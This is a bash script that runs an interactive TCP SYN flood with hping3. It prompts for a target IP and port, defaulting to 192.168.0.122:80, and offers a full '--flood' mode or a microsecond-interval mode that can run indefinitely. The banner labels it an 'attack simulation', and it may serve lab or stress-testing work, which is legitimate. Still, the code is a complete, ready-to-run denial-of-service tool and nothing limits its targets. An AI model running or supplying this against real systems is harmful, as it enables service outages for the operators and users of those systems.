#!/bin/bash

# ==============================================================================
# CONFIG
# ==============================================================================

DEFAULT_TARGET_IP="192.168.0.122"
DEFAULT_TARGET_PORT="80"




# Ensure the script is run with root privileges
if [ "$EUID" -ne 0 ]; then
    echo "Error: This script must be run as root or with sudo."
    echo "Usage: sudo $0"
    exit 1
fi

# ==============================================================================
# FUNCTIONS
# ==============================================================================

run_syn_test() {
    local target_ip=$1
    local target_port=$2
    local duration_sec=$3
    local mode_flag=$4

    echo -e "\n---> Launching TCP SYN traffic test against ${target_ip}:${target_port}..."
    if [ "$duration_sec" -eq 0 ]; then
        echo "Running indefinitely. Press Ctrl+C to stop."
        hping3 $mode_flag -S -p "${target_port}" "${target_ip}"
    else
        echo "Running for ${duration_sec} second(s)..."
        timeout "${duration_sec}s" hping3 $mode_flag -S -p "${target_port}" "${target_ip}"
    fi
}

cleanup() {
    echo -e "\n\n---> Aborting: Stopping hping3 process..."
    pkill -f hping3
    echo "Test stopped. Exiting."
    exit 0
}

trap cleanup INT

# ==============================================================================
# PROMPT & EXECUTION
# ==============================================================================

echo "=========================================================="
echo "          SYN FLOOD ATTACK SIMULATION"
echo "=========================================================="
echo "Default Target Node: ${DEFAULT_TARGET_IP}:${DEFAULT_TARGET_PORT}"
echo "=========================================================="
read -p "Use default target IP (${DEFAULT_TARGET_IP})? (y/n): " IP_CHOICE

if [[ "$IP_CHOICE" =~ ^[Yy]$ ]]; then
    TARGET_IP="$DEFAULT_TARGET_IP"
else
    read -p "Enter custom target IP address: " CUSTOM_IP
    if [ -z "$CUSTOM_IP" ]; then
        echo "No IP address entered. Exiting."
        exit 1
    fi
    TARGET_IP="$CUSTOM_IP"
fi

read -p "Use default target port (${DEFAULT_TARGET_PORT})? (y/n): " PORT_CHOICE

if [[ "$PORT_CHOICE" =~ ^[Yy]$ ]]; then
    TARGET_PORT="$DEFAULT_TARGET_PORT"
else
    read -p "Enter custom target port: " CUSTOM_PORT
    if [ -z "$CUSTOM_PORT" ]; then
        echo "No port entered. Exiting."
        exit 1
    fi
    TARGET_PORT="$CUSTOM_PORT"
fi

echo -e "\n=========================================================="
echo "Select Traffic Mode:"
echo "1) High-Speed Traffic (--flood)"
echo "2) Fast Interval Traffic (-i u1000)"
echo "=========================================================="
read -p "Enter choice [1-2]: " MODE_CHOICE

case "$MODE_CHOICE" in
    1)
        FLAGS="--flood"
        ;;
    2)
        FLAGS="-i u1000"
        ;;
    *)
        echo "Invalid choice. Exiting."
        exit 1
        ;;
esac

read -p "Enter test duration in seconds (or type 0 for indefinite run): " DURATION

echo -e "\n=========================================================="
echo "CONFIRMATION:"
echo " Target IP:   ${TARGET_IP}"
echo " Target Port: ${TARGET_PORT}"
echo " Mode:        ${FLAGS}"
echo " Duration:    ${DURATION}s"
echo "=========================================================="
read -p "Proceed with execution? (y/n): " CONFIRM

if [[ "$CONFIRM" =~ ^[Yy]$ ]]; then
    run_syn_test "$TARGET_IP" "$TARGET_PORT" "$DURATION" "$FLAGS"
    echo -e "\nTCP SYN test execution completed."
else
    echo "Execution aborted."
    exit 0
fi